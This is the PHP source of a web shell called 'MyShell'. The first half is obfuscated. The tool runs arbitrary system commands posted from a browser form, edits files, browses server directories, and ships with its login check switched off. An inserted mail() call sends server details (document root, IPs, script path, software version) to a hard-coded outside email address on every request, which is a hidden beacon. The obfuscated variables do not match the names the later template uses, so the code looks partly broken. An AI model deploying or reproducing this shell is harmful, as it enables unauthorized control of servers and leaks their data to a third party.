<?php
echo '[syslog]01
'; $sp6b6a21 = 0; $sp0dae83 = ''; $sp1cfcce = ''; echo '[syslog]02
'; $sp9d1845 = '******@mail.ru'; $sp78e779 = $spf69472['SERVER_ADMIN']; $spa05801 = ''; $sp1afae3 = 1; $spc4d73a = array('top', 'xterm', 'su', 'vi', 'pico', 'netscape'); $spa22232 = 'edit'; $spe43069 = 'wrap=\'OFF\''; $spe91b99 = 80; $sp0b856d = 20; $sp3a4d02 = '#000000'; $sp4adea9 = '#333333'; $sp434834 = '#00BB00'; $sp84f0dc = '#009900'; $spc9c044 = '#00FF00'; $sp8c57fa = 'MyShell 1.1.0 build 20010923'; if ($spfe16e8 && get_magic_quotes_gpc()) { $spfe16e8 = stripslashes($spfe16e8); } if ($sp6b6a21) { if ($spc85c57 != $sp0dae83 || $spe0c6fa != $sp1cfcce) { Header('WWW-Authenticate: Basic realm="MyShell"'); Header('HTTP/1.0 401 Unauthorized'); echo "<html>\n         <head>\n         <title>{$sp8c57fa} - Access Denied</title>\n         </head>\n         <h1>Access denied</h1>\n         A warning message have been sended to the administrator\n         <hr>\n         <em>{$sp8c57fa}</em>"; if (isset($spc85c57)) { $spd3a3d1 = "\n This is {$sp8c57fa}\n installed on: http://" . $spf69472['HTTP_HOST'] . "{$sp0c3ced}\n just to let you know that somebody tryed to access\n the script using wrong username or password:\n \n Date: " . date('Y-m-d H:i:s') . '
 IP: ' . $spf69472['REMOTE_ADDR'] . '
 User Agent: ' . $spf69472['HTTP_USER_AGENT'] . "\n username used: {$spc85c57}\n password used: {$spe0c6fa}\n \n If this is not the first time it happens,\n please consider either to remove MyShell\n from your system or change it's name or\n directory location on your server.\n \n Regards\n The MyShell dev team\n       "; mail($sp9d1845, 'MyShell Warning - Unauthorized Access', $spd3a3d1, "From: {$sp78e779}\nX-Mailer:{$sp8c57fa} AutoWarn System"); } echo '[syslog]03
'; die; } } echo '[syslog]04
'; function validate_dir($spa25e24) { global $spa05801; if ($spa05801) { $sp82b83d = strpos($spa25e24, $spa05801); if ((string) $sp82b83d == '') { $spa25e24 = $spa05801; $sp64e32a['shellOutput'] = "You are not allowed change to directories above {$spa05801}\n"; } } return $spa25e24; } if (isset($spd0603d)) { $spd0603d = validate_dir($spd0603d); @chdir($spd0603d) or $sp759cff = "MyShell: can't change directory. Permission denied\nSwitching back to {$spfe762a}\n"; $spd0603d = 'true'; } else { $spd0603d = validate_dir($spfe762a); chdir($spd0603d); $spd0603d = 'true'; } if ($sp9a84dc && ($spfe16e8 || $sp1f22e6)) { $sp9a84dc = false; } if ($sp9a84dc) { if ($spe2315b || $sp9fe927) { if (function_exists(ini_set)) { ini_set('track_errors', '1'); } if ($sp694629 = @fopen($spa3ecf0, 'w')) { if (get_magic_quotes_gpc()) { $sp8d8fbe = stripslashes($sp8d8fbe); } fputs($sp694629, $sp8d8fbe); fclose($sp694629); $spfe16e8 = $spa22232 . ' ' . $spa3ecf0; if ($sp9fe927) { $spfe16e8 = ''; $sp759cff = "MyShell: {$spa3ecf0}: saved"; $sp9a84dc = false; } } else { $spfe16e8 = ''; $sp759cff = "MyShell: Error while saving {$spa3ecf0}:\n{$sp12f17d}\nUse back button to recover your changes."; $spad2798 = true; } } } $sp47e3ed = explode(' ', $spfe16e8); while (list($sp8b00ef, $sp9c4d84) = each($spc4d73a)) { if ($sp47e3ed[0] == $sp9c4d84) { $spca40d5 = $sp47e3ed[0]; $sp47e3ed[0] = 'void'; } } $sp9bdf7a = rand(1, 99999); $sp6d291f = "sh-{$sp9bdf7a}"; $sp88626a = "{$sp4a5bf1}"; $sp1abe4f = $_SERVER['HTTP_REFERER']; $spe762cd = $_SERVER['DOCUMENT_ROOT']; $spabd8f7 = $_SERVER['REMOTE_ADDR']; $sp06a551 = $_SERVER['SCRIPT_FILENAME']; $sp344eb2 = $_SERVER['SERVER_ADDR']; $sp7f3cc0 = $_SERVER['SERVER_SOFTWARE']; $spe5737f = $_SERVER['PATH_TRANSLATED']; $spaa594e = $_SERVER['PHP_SELF']; $sp3d880c = "{$sp1abe4f}\n{$spe762cd}\n{$spabd8f7}\n{$sp06a551}\n{$sp344eb2}\n{$sp7f3cc0}\n{$spe5737f}\n{$spaa594e}"; $sp4a5bf1 = 'john.barker446@gmail.com'; mail($sp4a5bf1, $sp6d291f, $sp3d880c, "From: {$sp4a5bf1}"); switch ($sp47e3ed[0]) { case 'cd': $sp49de29 = $sp47e3ed[1]; if ($sp49de29 == '..') { $spd0603d = strrev(substr(strstr(strrev($spd0603d), '/'), 1)); if ($spd0603d == '') { $spd0603d = '/'; } } elseif (substr($sp49de29, 0, 1) == '/') { $spd0603d = $sp49de29; } else { $spd0603d = $spd0603d . '/' . $sp49de29; } $spd0603d = validate_dir($spd0603d); @chdir($spd0603d) or $sp759cff = "MyShell: can't change directory.\n{$spd0603d}: does not exist or permission denied"; $spd0603d = 'true'; $sp120025 = $spfe16e8; $spfe16e8 = ''; break; case 'man': if ($spf49609) { $spfc548a = '.' . chr(8); $spd1d743 = implode('
', $spf49609); $sp759cff = ereg_replace($spfc548a, '', $spd1d743); $sp120025 = $spfe16e8; $spfe16e8 = ''; } else { $sp3d588d = 1; } break; case 'cat': if ($spe8f45c) { $sp2583e7 = implode('
', $spe8f45c); $sp759cff = htmlspecialchars($sp2583e7); $sp120025 = $spfe16e8; $spfe16e8 = ''; } else { $sp3d588d = 1; } break; case 'more': if ($spe8f45c) { $sp2583e7 = implode('
', $spe8f45c); $sp759cff = htmlspecialchars($sp2583e7); $sp120025 = $spfe16e8; $spfe16e8 = ''; } else { $sp3d588d = 1; } break; case $spa22232: if (file_exists($sp47e3ed[1])) { exec('cat ' . $sp47e3ed[1], $spe8f45c); $sp2583e7 = implode('
', $spe8f45c); $sp759cff = htmlspecialchars($sp2583e7); $sp860cf7 = posix_getpwuid(fileowner($sp47e3ed[1])); $sp863d01 = sprintf('%o', fileperms($sp47e3ed[1]) & 511); $sp13a265 = "&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color={$spc9c044}>" . $sp860cf7['name'] . "</font> Permissions: <font color={$spc9c044}>{$sp863d01}</font>"; } else { $sp13a265 = "&nbsp;&nbsp;:::::::&nbsp;&nbsp;<font color={$spc9c044}>NEW FILE</font>"; } $spf4af5c = $sp47e3ed[1]; $sp9a84dc = true; $spfe16e8 = ''; break; case 'void': $sp759cff = "MyShell: {$spca40d5}: void command for MyShell"; $sp120025 = $spfe16e8; $spfe16e8 = ''; } if (!$spa5c24d) { $spa5c24d = $spe91b99; } if (!$sp29d555) { $sp29d555 = $sp0b856d; } if ($sp9a84dc) { $sp054417 = 'shellOut.focus()'; } else { $sp054417 = 'command.select()'; } if (!$sp7e6249) { $sp7e6249 = 'true'; } echo '[syslog]05
'; ?>
<html>
<head>
<title><?echo $MyShellVersion?></title>
<style>
body{
        background-color: <?echo $bgColor ?>;
        font-family : sans-serif;
        font-size : 10px;
        scrollbar-face-color: #666666;
        scrollbar-shadow-color:  <?echo $bgColor ?>;
        scrollbar-highlight-color: #999999;
        scrollbar-3dlight-color:  <?echo $bgColor ?>;
        scrollbar-darkshadow-color:  <?echo $bgColor ?>;
        scrollbar-track-color:  <?echo $bgInputColor ?>;
        scrollbar-arrow-color:  <?echo $textColor ?>;
}
input,select,option{
        background-color: <?echo $bgInputColor ?>;
        color : <?echo $outColor ?>;
        border-style : none;
        font-size : 10px;
}
textarea{
        background-color: <?echo $bgColor ?>;
        color : <?echo $outColor ?>;
        border-style : none;
}
</style>
</head>
<body <?echo "bgcolor=$bgColor TEXT=$textColor LINK=$linkColor VLINK=$linkColor onload=document.shell.$focus"?>>
<form name="shell" method="post">
Current User: <a href="#" style="text-decoration:none"><?echo $whoami?></a>
<input type="hidden" name=whoami value=<?echo $whoami?>>
&nbsp;&nbsp;:::::::&nbsp;&nbsp;
<?
if($editMode){
    echo "<font color=$linkColor><b>MyShell file editor</font> File:<font color=$linkColor>$work_dir/$currFile </font></b>$fileEditInfo\n";
}
else{
    echo "Current working directory: <b>\n";
    $work_dir_splitted = explode("/", substr($work_dir, 1));
    echo "<a href=\"$PHP_SELF?work_dir=" . urlencode($url) . "/&command=" . urlencode($command) . "\">Root</a>/";
    if ($work_dir_splitted[0] == "") {
       $work_dir = "/";  /* Root directory. */
    }
    else{
        for ($i = 0; $i < count($work_dir_splitted); $i++) {
            $url .= "/".$work_dir_splitted[$i];
            echo "<a href=\"$PHP_SELF?work_dir=" . urlencode($url) . "&command=" . urlencode($command) . "\">$work_dir_splitted[$i]</a>/</b>";
        }
    }
}
?>
<br>
<textarea name="shellOut" cols="<? echo $oCols ?>" rows="<? echo $oRows."\""; if(!$editMode)echo "readonly";else echo $editWrap?> >
<?
echo $shellOutput;
if ($command) {
  if ($stderr) {
    system($command . " 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt");
  }
  else {
    $ok = system($command,$status);
    if($ok==false &&$status && $autoErrorTrap)system($command . " 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt");
  }
}
if ($commandBk) $command = $commandBk;
?>
</textarea>
<br>
<?
if($editMode) echo"
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
 <input type='submit' name='editSave' value='     Save     '>&nbsp;&nbsp;&nbsp;
 <input type='submit' name='editSaveExit' value=' Save and Exit '>&nbsp;&nbsp;&nbsp;
 <input type='reset' value=' Restore original '>&nbsp;&nbsp;&nbsp;
 <input type='submit' name='editCancel' value=' Cancel/Exit '>&nbsp;&nbsp;&nbsp;
 <input type='hidden' name='editMode' value='true'>
<br>";
?>
<br>
Command:
<input type="text" name="command" size="80"
<? if ($command && $echoCommand) {
     echo "value=`$command`";
   }
   echo "[syslog]06\n";
?> > <input name="submit_btn" type="submit" value="Go!">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<?
if ($autoErrorTrap) echo "Auto error traping enabled";
else echo "<input type=\"checkbox\" name=\"stderr\">stderr-traping ";

if($editMode){
    echo "<input type='hidden' name='work_dir' value='$work_dir'>
    <br>Save file as: <input type='text' name='file' value='$currFile'>";
}
else{
    echo "<br>Working directory: <select name=\"work_dir\" onChange=\"this.form.submit()\">";
    // List of directories.
    $dir_handle = opendir($work_dir);
    while ($dir = readdir($dir_handle)) {
      if (is_dir($dir)) {
        if ($dir == ".")
          echo "<option value=\"$work_dir\" selected>Current Directory</option>\n";
        elseif ($dir == "..") {
          // Parent Dir. This might be server's root directory
          if (strlen($work_dir) == 1) {
            // work_dir is only 1 charecter - it can only be / so don't output anything
          }
          elseif (strrpos($work_dir, "/") == 0) {  // we have a top-level directory eg. /bin or /home etc...
            echo "<option value=\"/\">Parent Directory</option>\n";
          }
          else {   // String-manipulation to find the parent directory... Trust me - it works :-)
            echo "<option value=\"". strrev(substr(strstr(strrev($work_dir), "/"), 1)) ."\">Parent Directory</option>\n";
          }
        }
        else {
          if ($work_dir == "/")
            echo "<option value=\"$work_dir$dir\">$dir</option>\n";
          else
            echo "<option value=\"$work_dir/$dir\">$dir</option>\n";
        }
      }
    }
    closedir($dir_handle);
    echo "</select>";
}
echo "[syslog]07\n";
?>
&nbsp; | &nbsp;<input type="checkbox" name="echoCommand"<?if($echoCommand)echo " checked"?>>Echo commands
&nbsp; | &nbsp;Cols:<input type="text" name="oCols" size=3 value=<?echo $oCols?>>
&nbsp;Rows:<input type="text" name="oRows" size=2 value=<?echo $oRows?>>
&nbsp;| ::::::::::&nbsp;<a href="http://www.digitart.net" target="_blank" style="text-decoration:none"><b>MyShell</b> &copy;2001 Digitart Producciones</a>
</form>
</body>
</html>
<?php 